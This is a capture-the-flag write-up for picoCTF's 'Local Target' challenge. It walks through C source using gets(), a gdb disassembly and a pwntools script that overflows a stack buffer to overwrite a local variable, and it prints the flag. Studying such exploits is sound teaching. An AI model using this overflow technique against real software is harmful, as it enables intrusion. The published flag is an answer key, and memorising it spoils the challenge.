# Local Target

**Author:** [yairp03](https://github.com/yairp03)  
**Category:** Binary Exploitation  
**Points:** 100

# Challenge

## Description

Smash the stack
Can you overflow the buffer and modify the other local variable? The program is available [here](./local-target). You can view source [here](./local-target.c). And connect with it using:
`nc saturn.picoctf.net 50983`

## Source

[local-target.c](./local-target.c) (C source)  
[local-target](./local-target) (64-bit ELF)

# Solution

Let's look at the given source code:

```c
int main(){
  // ...
  char input[16];
  int num = 64;
  
  printf("Enter a string: ");
  // ...
  gets(input);
  // ...
  
  printf("num is %d\n", num);
  // ...
  
  if( num == 65 ){
    printf("You win!\n");
    // Prints the flag
  }
  // ...
}
```

The program reads a string from the user, into a buffer of size 16, and then prints the value of `num`. If `num` is 65, the flag is printed. The program use `gets()` to read the string, which is vulnerable to [buffer overflow](/Guides/Vulnerabilities/Buffer%20Overflow%20Vulnerability.md). Let's look at the relative positions of the local variables on the stack:

```bash
$ gdb ./local-target
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000401236 <+0>:     endbr64
   0x000000000040123a <+4>:     push   rbp
   0x000000000040123b <+5>:     mov    rbp,rsp
   0x000000000040123e <+8>:     sub    rsp,0x20
   0x0000000000401242 <+12>:    mov    DWORD PTR [rbp-0x8],0x40
   0x0000000000401249 <+19>:    lea    rdi,[rip+0xdb4]        # 0x402004
   0x0000000000401250 <+26>:    mov    eax,0x0
   0x0000000000401255 <+31>:    call   0x4010f0 <printf@plt>
   0x000000000040125a <+36>:    mov    rax,QWORD PTR [rip+0x2e0f]        # 0x404070 <stdout@@GLIBC_2.2.5>
   0x0000000000401261 <+43>:    mov    rdi,rax
   0x0000000000401264 <+46>:    call   0x401120 <fflush@plt>
   0x0000000000401269 <+51>:    lea    rax,[rbp-0x20]
   0x000000000040126d <+55>:    mov    rdi,rax
   0x0000000000401270 <+58>:    mov    eax,0x0
   0x0000000000401275 <+63>:    call   0x401110 <gets@plt>
   ...
End of assembler dump.
```

We can see from line `<+12>` that `num` is at `[rbp-0x8]`, as it is being set with `0x40`, which is `64` in decimal. We can also see that the address of `[rbp-0x20]` is being passed to `gets()`, so it is the address of `input`.  Now we can know how much we need to overflow the buffer, in order to overwrite `num`. We need to write `0x20 - 0x8` bytes, and then write `65` to `num`. Let's use [pwntools](/Guides/Tools/pwntools.md) for that:

```python
from pwn import *

conn = remote('saturn.picoctf.net', 50983)

conn.sendlineafter(b'string: ', b'A' * (0x20 - 0x8) + p32(65))
conn.recvuntil(b'You win!\n')
flag = conn.recvline(False).decode()

print('Flag:', flag)
```

```
picoCTF{l0c4l5_1n_5c0p3_fee8ef05}
```

**The Flag:** `picoCTF{l0c4l5_1n_5c0p3_fee8ef05}`
